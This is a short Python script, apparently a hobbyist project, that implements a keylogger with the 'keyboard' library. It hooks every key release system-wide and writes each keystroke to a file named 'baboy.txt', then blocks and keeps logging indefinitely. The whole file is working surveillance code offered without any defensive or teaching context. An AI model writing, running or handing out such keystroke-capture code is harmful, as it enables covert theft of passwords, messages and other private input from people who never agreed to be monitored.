import keyboard



class keylogger():
    def __init__(self,logFIle):
        self.f=open(logFIle,"w")

    def startLog(self):
      keyboard.on_release(callback=self.callback)
      keyboard.wait()

    def callback(self,event):
       button = event.name 
       if button == "space":
           button = " "
       if button == "enter":
         button ="\n"
    
       self.f.write(button)
       self.f.flush()
      




ads = keylogger("baboy.txt")
ads.startLog()

print(" harel weiss")